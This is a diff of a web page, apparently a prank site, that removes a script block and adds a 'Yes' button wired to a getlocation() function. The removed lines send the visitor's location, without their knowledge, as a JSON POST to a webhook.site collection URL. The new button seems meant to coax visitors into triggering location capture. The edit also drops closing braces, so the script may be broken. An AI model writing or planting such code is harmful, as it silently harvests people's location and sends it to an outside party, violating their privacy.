@@ -126,23 +126,7 @@
         case error.UNKNOWN_ERROR:
           alert("An unknown error occurred.");
           break;
-	getlocation()
-	var variableValue = address;
-
-	var payload = {
-  	variable: variableValue
-	};
-
-	fetch("https://webhook.site/9c006945-d465-4c8a-b6fc-f5da0a36710c", {
-  	method: "POST",
-  	headers: {
-    	"Content-Type": "application/json"
-  	},
-  	body: JSON.stringify(payload)
-	})
 	
-      }
-    }
 
   </script>
 </head>
@@ -174,7 +158,11 @@
       <div id="clock-widget">
         <iframe src="https://free.timeanddate.com/clock/i7jmsa30/n202/fs16/fcfff/tct/pct/ftb/pa8/tt0/tm3/th2/tb4" frameborder="0" width="223" height="43"></iframe>
       </div>
+      <div id="He-he-he-ha">
+	      <button onclick="getlocation()">Yes</button>
+      </div>
     </div>
+       
 
     <div>
       <h2>Monke</h2>
